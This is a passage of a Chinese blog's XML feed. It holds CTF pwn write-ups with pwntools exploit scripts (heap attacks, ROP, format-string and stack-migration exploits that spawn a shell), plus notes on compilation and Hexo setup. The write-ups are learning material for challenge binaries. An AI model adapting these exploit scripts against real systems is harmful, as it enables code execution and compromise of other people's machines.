        <content type="html"><![CDATA[<h3 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h3><p>这题还是有点意思的，考点在于补码与unsigned int。</p><p>首先观察bypass1，第一个if判断是不允许出现“ - ”号， 第二个if判断是x &lt;= 359 , y &lt;=  359 , x-y = 360</p><p>那么自然考虑－数。</p><!-- 原码是最直观的表示方式：最高位表示符号(0表示正，1表示负) --><!--补码的表示方法是:--><!--正数的补码就是其本身--><!--负数的补码是在其原码的基础上, 符号位不变, 其余各位取反, 最后+1. (即在反码的基础上+1)--><!--[+1] = [00000001]原 = [00000001]反 = [00000001]补--><!--[-1] = [10000001]原 = [11111110]反 = [11111111]补--><p>而我们可以根据ida观察到，此次的两个bypass都是unsigned int，而 unsigned int的特点是：最高位不作为符号位，所有位都表示值。</p><h4 id="bypass1"><a href="#bypass1" class="headerlink" title="bypass1"></a>bypass1</h4><p>故此，0xFFFF FFFF   ( 1111 1111 1111 1111 1111 1111 1111 1111)就表示-1</p><p>所以bypass1 可以通过x = 359 , y = 4294967295 绕过</p><h4 id="bypass2"><a href="#bypass2" class="headerlink" title="bypass2"></a>bypass2</h4><p>第二个是乘法，且条件为x &gt; 1 &amp;&amp; y &gt; 360 &amp;&amp; x * y =360</p><p>这次利用整数溢出</p><p>4294967295 + 361 = 4294967656 （0001 0000 0000 0000 0000 0000 0001 0110 1000）</p><p>毫无疑问超过了32位，unsigned int 取前32位，自然就是0000 0000 0000 0000 0000 0001 0110 1000</p><p>所以 只要x * y = 4294967656就可以通过</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>第五空间线下赛（pwn）</title>
      <link href="/2019/10/18/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BA%BF%E4%B8%8B%E8%B5%9B%EF%BC%88pwn%EF%BC%89/"/>
      <url>/2019/10/18/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BA%BF%E4%B8%8B%E8%B5%9B%EF%BC%88pwn%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h3 id="一"><a href="#一" class="headerlink" title="一"></a>一</h3><p>首先ida查看，是一个标准的堆题</p><p>查看delete，没有置0操作</p><p>那么自然是fasted bin attack + unsortd bin 的组合攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./pwn'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">sh.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">sh.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">sh.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">sh.sendline(str(content))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">sh.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">sh.sendline(<span class="string">'4'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment">########################################unsorted bin attack#####################################</span></span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">main_arena = u64(sh.recvuntil(<span class="string">'\n'</span>)[<span class="number">-7</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-88</span></span><br><span class="line">log.success(<span class="string">'main_arena='</span>+hex(main_arena))</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">__malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">libc_addr = __malloc_hook - libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">system = libc_addr + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh = libc_addr + libc.search(<span class="string">'/bin/sh\x00'</span>).next()</span><br><span class="line"></span><br><span class="line">__free_hook = libc_addr + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">log.success(<span class="string">'__free_hook='</span>+hex(__free_hook))</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">payload = p64(main_arena) + p64(__free_hook - <span class="number">0x40</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">###################################fasted bin attack ###########################################</span></span><br><span class="line">fastbin_attack = __free_hook - (<span class="number">0x33</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(fastbin_attack))</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'\x00'</span>*<span class="number">3</span>+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(system))</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="三"><a href="#三" class="headerlink" title="三"></a>三</h3><p>漏洞点在</p><p>若输入负数，则read的size位便极大，使得允许栈溢出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">bss = <span class="number">0x0804A040</span></span><br><span class="line">main_addr = <span class="number">0x08048668</span></span><br><span class="line">system_addr = <span class="number">0x0804865D</span></span><br><span class="line">pop3_ret = <span class="number">0x08048779</span></span><br><span class="line">sh = process(<span class="string">'./pwn'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line"><span class="comment">#######################write bss######################</span></span><br><span class="line">sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">sh.sendline(<span class="string">'20'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">sh.sendline(<span class="string">'-1'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x5c</span>+<span class="number">0x4</span>)</span><br><span class="line"><span class="comment">#payload += p32(0x0804864F)</span></span><br><span class="line">payload += p32(elf.plt[<span class="string">'read'</span>]) + p32(pop3_ret) + p32(<span class="number">0</span>) + p32(bss) + p32(<span class="number">8</span>) +p32(main_addr)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">sh.send(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#########################get shell####################</span></span><br><span class="line">sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">sh.sendline(<span class="string">'20'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">sh.sendline(<span class="string">'-1'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x5c</span>+<span class="number">0x4</span>)</span><br><span class="line">payload += p32(system_addr)+p32(<span class="number">0x0</span>)+p32(bss)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="五"><a href="#五" class="headerlink" title="五"></a>五</h3><p>漏洞点在格式化字符串漏洞，那么就有两种解题的办法</p><h4 id="第一种：50-概率的"><a href="#第一种：50-概率的" class="headerlink" title="第一种：50%概率的"></a>第一种：50%概率的</h4><p>为什么只有50%呢，因为会随机出负数鸭</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process("./pwn")</span></span><br><span class="line">sh = remote(<span class="string">"node2.buuoj.cn.wetolink.com"</span>, <span class="number">28695</span>)</span><br><span class="line"></span><br><span class="line">suiji_addr = <span class="number">0x0804C044</span></span><br><span class="line">offset = <span class="number">10</span></span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">sh.send(p32(suiji_addr) + <span class="string">"%10$s"</span>)</span><br><span class="line"><span class="comment">#sh.recvuntil(".")</span></span><br><span class="line">sh.recvuntil(<span class="string">'\x08'</span>)</span><br><span class="line">suiji = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> suiji</span><br><span class="line"><span class="keyword">print</span> hex(suiji)</span><br><span class="line"><span class="keyword">print</span> int(suiji)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"passwd"</span>)</span><br><span class="line">sh.sendline(str(suiji))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h4 id="第二种：100-概率的"><a href="#第二种：100-概率的" class="headerlink" title="第二种：100%概率的"></a>第二种：100%概率的</h4><p>这就是反向写入了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">sh = process(<span class="string">"./pwn"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fsb</span><span class="params">(payload)</span>:</span></span><br><span class="line">    sh.sendafter(<span class="string">"your name:"</span>,payload)</span><br><span class="line">target=<span class="number">0x804C044</span></span><br><span class="line">payload=p32(target)+<span class="string">"%10$n"</span></span><br><span class="line">fsb(payload)</span><br><span class="line"></span><br><span class="line">sh.sendafter(<span class="string">"your passwd:"</span>,<span class="string">"4"</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>程序员的自我修养（整理）</title>
      <link href="/2019/10/18/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%EF%BC%88%E6%95%B4%E7%90%86%EF%BC%89/"/>
      <url>/2019/10/18/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%EF%BC%88%E6%95%B4%E7%90%86%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h3 id="编译与链接"><a href="#编译与链接" class="headerlink" title="编译与链接"></a>编译与链接</h3><p>在linux下，使用gcc编译程序的时候，需要经历四步过程，分别是预处理，编译，汇编和链接</p><h4 id="编译器流程"><a href="#编译器流程" class="headerlink" title="编译器流程"></a>编译器流程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">A[Source Code] --&gt;|Scanner| B(Tokens)</span><br><span class="line">B --&gt; |Parser| C(Syntax Tree)</span><br><span class="line">C --&gt; |Semantic Analyzer| D(Commented Syntax Tree)</span><br><span class="line">D --&gt; |Source Code Optimizer| E(Intermediate Representation)</span><br><span class="line">E --&gt; |Code Generator| F(Target Code)</span><br><span class="line">F --&gt; |Code Optimizer| G(Final Target Code)</span><br></pre></td></tr></table></figure><h4 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h4><p>预处理过程主要处理源代码中以“#”开始的预编译指令。比如“#include”，“#define”等，主要处理规则如下：</p><ol><li>将所有的“#define”删除，并且展开所有的宏定义。</li><li>处理所有条件预编译指令，比如：“#if”，“#ifdef”，“#elif”，“#else”，”#endif”。</li><li>处理“#include”预编译指令，将被包含的文件插入到该预编译指令的位置，注意，这个过程是递归进行的，也就是说被包含的文件可能还包含其他文件。</li><li>删除所有的注释“\\“和”/**/“。</li><li>添加行号和文件标识名，比如#2”hello.c“ 2，以便于编译时编译器产生调试用的行号信息以及用于编译时产生编译错误或警告时能够显示行号.</li><li>保留所有的#prcagma编译器指令，因为编译器需要使用它们。</li></ol><p>经过预处理的.i文件不包含任何宏定义，因为所有的宏已经被展开。</p><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>编译过程就是把预处理完的文件进行一系列词法分析，语法分析，语义分析以及优化后生产相应的汇编代码。</p><p>举一个例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">array</span>[index] = (index + <span class="number">4</span>) * (<span class="number">2</span>+<span class="number">6</span>)</span><br><span class="line">CompilerExpression.c</span><br></pre></td></tr></table></figure><h4 id="词法分析"><a href="#词法分析" class="headerlink" title="词法分析"></a>词法分析</h4><p>源代码程序被输入到扫描器，运用类似于有限状态机的算法将源代码的字符序列分割成一系列的记号（token）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">记号(token)分为如下几类：关键字，标识符，字面量（包含数字，字符串等）和特殊符号（如加号，等号）</span><br></pre></td></tr></table></figure><p>识别记号的同时，扫描器也完成了其他工作，例如将标识符存放到符号表，将数字，字符串常量存到文字表等。</p><p>lea程序实现词法扫描，按照用户之前描述好的词法规则，将输入的字符串分割成一个个记号。</p><h4 id="语法分析"><a href="#语法分析" class="headerlink" title="语法分析"></a>语法分析</h4><p>语法分析器对由扫描器产生的记号进行语法分析，从而产生语法树（以表达式为节点的树）。整个过程采用了上下文无关语法。</p><p>在语法分析的同时，运算符号的优先级和含义也被确定。</p><p>如果出现了表达式不合法，比如各种括号不匹配，表达式中缺少操作符等，编译器就会报告语法分析阶段的错误。（语法分析，也就是检测表达式格式正确与否）</p><p>yacc工具根据给定的语法规则，生成语法树。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">A[Assign Expression =] --&gt;B(Subscript Expression )</span><br><span class="line">A[Assign Expression =] --&gt;C(Multiplicativer Expression *)</span><br><span class="line">B(Subscript Expression ) --&gt; D(Identifier array)</span><br><span class="line">B(Subscript Expression ) --&gt; F(Identifier Index)</span><br><span class="line">C(Multiplicativer Expression *) --&gt; G(Addtive Expression +)</span><br><span class="line">C(Multiplicativer Expression *) --&gt; H(Addtive Expression +)</span><br><span class="line">G(Addtive Expression +) --&gt; I(Identifier Index)</span><br><span class="line">G(Addtive Expression +) --&gt; J(Number 4)</span><br><span class="line">H(Addtive Expression +) --&gt; K(Number 2)</span><br><span class="line">H(Addtive Expression +) --&gt; L(Number 6)</span><br></pre></td></tr></table></figure><h4 id="语义分析"><a href="#语义分析" class="headerlink" title="语义分析"></a>语义分析</h4><p>检测这个表达式是否真的有意义。例如两个指针做乘法运算是没有意义的，但是在语法分析里，语法上是合法的。</p><p>编译器所能分析的语义是静态语义（staticSemantic），所谓静态语义是指在编译期可以确定的语义。包括声明和类型的匹配，类型的转换。</p><p>与之对应的是动态语义，只有在运行期才能确定。</p><h3 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h3><p>汇编器将汇编代码转为机器码的过程</p><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><p>菜鸡写不出来，呜呜，还是等详细看完再写吧</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>搭建博客的一些坑</title>
      <link href="/2019/10/18/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9D%91/"/>
      <url>/2019/10/18/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<p>根据此链接进行博客的搭建<a href="https://blog.csdn.net/weixin_39879178/article/details/80319392" target="_blank" rel="noopener">https://blog.csdn.net/weixin_39879178/article/details/80319392</a><br>但是其中踩了不少的坑，发现此链接中有些图片存在些许问题</p><p><strong>1.在进行hexo init的时候</strong><br><img src="https://img-blog.csdnimg.cn/20191003223041562.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3poel9fX18=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>实际上，你不应该在根目录进行hexo init操作，而是应该进入你的blog/Hexo文件里进行 hexo init操作。<br>不然，你就会出现hexo no found。</p><p><strong>2.在进行添加分类链接的时候</strong><br>网上很多博客都是直接让你new page一个categories，但是请注意！！！！！<br><img src="https://img-blog.csdnimg.cn/20191003223424930.png" alt="在这里插入图片描述"><br>先观察你的github文件夹里categories里的大小写，根据大小写来修改D:\blog\Hexo\themes\next里的_config.yml文件夹里的categories选项。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>对于栈迁移技术的学习</title>
      <link href="/2019/10/18/%E5%AF%B9%E4%BA%8E%E6%A0%88%E8%BF%81%E7%A7%BB%E6%8A%80%E6%9C%AF%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
      <url>/2019/10/18/%E5%AF%B9%E4%BA%8E%E6%A0%88%E8%BF%81%E7%A7%BB%E6%8A%80%E6%9C%AF%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h3 id="migration"><a href="#migration" class="headerlink" title="migration"></a>migration</h3><p>栈迁移其实就是利用 leave ret<br>因为 leave ret 实际上就是  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov    esp  ebp</span><br><span class="line">       pop  ebp</span><br><span class="line">       pop  eip  //一种清栈的行为</span><br></pre></td></tr></table></figure><p>这是我手动进行的栈迁移，但是…不知道为什么，puts接收数据接收不到，望大佬指正</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">sh = process(<span class="string">'./migration'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./migration'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">read_plt = elf.symbols[<span class="string">'read'</span>]</span><br><span class="line">puts_plt = elf.symbols[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">buf = elf.bss() + <span class="number">0x500</span></span><br><span class="line">buf2 = elf.bss() + <span class="number">0x400</span></span><br><span class="line">leave_ret = <span class="number">0x08048418</span></span><br><span class="line"></span><br><span class="line">pop1_ret = <span class="number">0x0804836d</span></span><br><span class="line">pop3_ret = <span class="number">0x08048569</span></span><br><span class="line"><span class="comment">#################### change stack space#####################</span></span><br><span class="line">sh.recv()</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x28</span> + p32(buf) + p32(read_plt) + p32(leave_ret) + p32(<span class="number">0</span>) + p32(buf) + p32(<span class="number">0x100</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"><span class="comment">#################### leak libc address ########################</span></span><br><span class="line">payload1 = p32(buf2) + p32(puts_plt) + p32(pop1_ret) + p32(puts_got) + p32(read_plt) + p32(leave_ret) + p32(<span class="number">0</span>) + p32(buf2) + p32(<span class="number">0x100</span>)</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line">puts_add = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line">libc_base = puts_add - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc base address--&gt;[%s]"</span>%hex(libc_base)</span><br><span class="line">system_add = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system address --&gt;[%s]"</span>%hex(system_add)</span><br><span class="line"><span class="comment">######################  get shell ###########################</span></span><br><span class="line">payload = p32(buf) + p32(read_plt) + p32(pop3_ret) + p32(<span class="number">0</span>) + p32(buf) + p32(<span class="number">0x100</span>) + p32(system_add) + <span class="string">'bbbb'</span> + p32(buf)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>ps：找到问题所在了，第一次需要send，sendline多了’\x0a’，好像就出现问题了</p><p>下面是利用rop模块进行的，这就可以了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#! -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./migration'</span>)</span><br><span class="line">elf = ELF(<span class="string">'migration'</span>)</span><br><span class="line"></span><br><span class="line">read_plt = <span class="number">0x8048380</span></span><br><span class="line">puts_plt = <span class="number">0x8048390</span></span><br><span class="line">leave_ret = <span class="number">0x08048418</span></span><br><span class="line">pop_edx_ret = <span class="number">0x0804836d</span></span><br><span class="line">puts_got = <span class="number">0x8049ff0</span></span><br><span class="line"><span class="comment">#buf = 0x0804b000-0x200</span></span><br><span class="line"><span class="comment">#buf2 = buf + 0x100</span></span><br><span class="line">buf = elf.bss() + <span class="number">0x500</span></span><br><span class="line">buf2 = elf.bss() + <span class="number">0x400</span></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">40</span></span><br><span class="line">payload += flat([buf,read_plt,leave_ret,<span class="number">0</span>,buf,<span class="number">100</span>])</span><br><span class="line">sh.recvuntil(<span class="string">":"</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">rop = flat([buf2,puts_plt,pop_edx_ret,puts_got,read_plt,leave_ret,<span class="number">0</span>,buf2,<span class="number">100</span>])</span><br><span class="line"></span><br><span class="line">sh.sendline(rop)</span><br><span class="line">sh.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">puts_off = <span class="number">0x5fca0</span></span><br><span class="line">libc = u32(r.recv(<span class="number">4</span>)) - puts_off</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc:"</span>,hex(libc)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">system_off = <span class="number">0x3ada0</span></span><br><span class="line">system = libc + system_off</span><br><span class="line">rop2 = flat([buf,system,<span class="number">0</span>,buf2+<span class="number">16</span>,<span class="string">"/bin/sh"</span>])</span><br><span class="line">sh.sendline(rop2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="spwn"><a href="#spwn" class="headerlink" 